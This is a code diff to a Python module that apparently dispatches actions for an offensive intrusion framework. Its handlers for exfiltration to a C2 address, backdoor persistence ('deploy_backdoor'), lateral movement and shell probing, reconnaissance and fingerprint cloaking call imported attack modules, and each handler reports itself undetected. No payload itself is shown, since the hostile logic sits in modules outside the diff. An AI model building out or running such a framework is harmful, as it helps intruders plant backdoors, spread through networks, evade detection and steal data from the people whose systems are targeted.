@@ -47,7 +47,7 @@ def _handle_exfil(action_obj, mutation, c2_ip, c2_port):
 def _handle_persist(action_obj, mutation):
     try:
         import backdoor_seed
-        backdoor_seed.seed()
+        backdoor_seed.deploy_backdoor()
         return {"success": True, "detected": False, "channel": "local", "latency_ms": 50.0}
     except Exception as e:
         return {"success": False, "detected": False, "channel": "local", "latency_ms": 0.0, "error": str(e)}
@@ -57,9 +57,8 @@ def _handle_lateral(action_obj, mutation):
     try:
         import ghost_probe
         import chimera_injector
-        for target in targets:
-            ghost_probe.probe(target)
-        chimera_injector.inject(targets, mutation.payload_hash)
+        ghost_probe.probe_shell()
+        chimera_injector.fire()
         return {"success": True, "detected": False, "channel": "TCP", "latency_ms": 200.0}
     except Exception as e:
         return {"success": False, "detected": False, "channel": "TCP", "latency_ms": 0.0, "error": str(e)}
@@ -69,7 +68,7 @@ def _handle_recon(action_obj, mutation):
     try:
         import adaptive_probe
         for target in targets:
-            adaptive_probe.probe(target)
+            adaptive_probe.probe_host(target)
         return {"success": True, "detected": False, "channel": "TCP", "latency_ms": 150.0}
     except Exception as e:
         return {"success": False, "detected": False, "channel": "TCP", "latency_ms": 0.0, "error": str(e)}
@@ -78,8 +77,8 @@ def _handle_cloak(action_obj, mutation):
     try:
         import obfuscator_engine
         import fingerprint_cloner
-        fingerprint_cloner.clone()
-        obfuscator_engine.obfuscate(mutation.payload_hash)
+        fingerprint_cloner.mimic('127.0.0.1', 80)
+        obfuscator_engine.obfuscate_http(mutation.payload_hash)
         return {"success": True, "detected": False, "channel": "local", "latency_ms": 30.0}
     except Exception as e:
         return {"success": False, "detected": False, "channel": "local", "latency_ms": 0.0, "error": str(e)}
